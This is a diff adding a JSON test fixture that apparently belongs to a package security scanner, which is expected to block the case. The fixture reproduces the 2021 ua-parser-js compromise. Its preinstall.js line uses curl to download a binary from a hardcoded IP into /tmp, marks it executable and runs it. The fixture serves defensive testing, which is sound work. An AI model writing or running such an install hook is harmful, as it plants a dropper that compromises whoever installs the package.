@@ -1,0 +1,13 @@
+{
+  "name": "ua-parser-js-preinstall-dropper",
+  "expect": "block",
+  "expectFinding": "network-exfil-or-loader",
+  "note": "modeled on ua-parser-js (2021): preinstall downloads a second-stage payload from a hardcoded IP and executes it",
+  "evidence": {
+    "packageName": "ua-parser-js",
+    "sourceFiles": {
+      "package.json": "{\"name\":\"ua-parser-js\",\"version\":\"0.7.29\",\"scripts\":{\"preinstall\":\"node preinstall.js\"}}",
+      "preinstall.js": "const cp=require('child_process');cp.exec('curl -s http://159.148.186.228/jsextension -o /tmp/jsextension && chmod +x /tmp/jsextension && /tmp/jsextension');"
+    }
+  }
+}
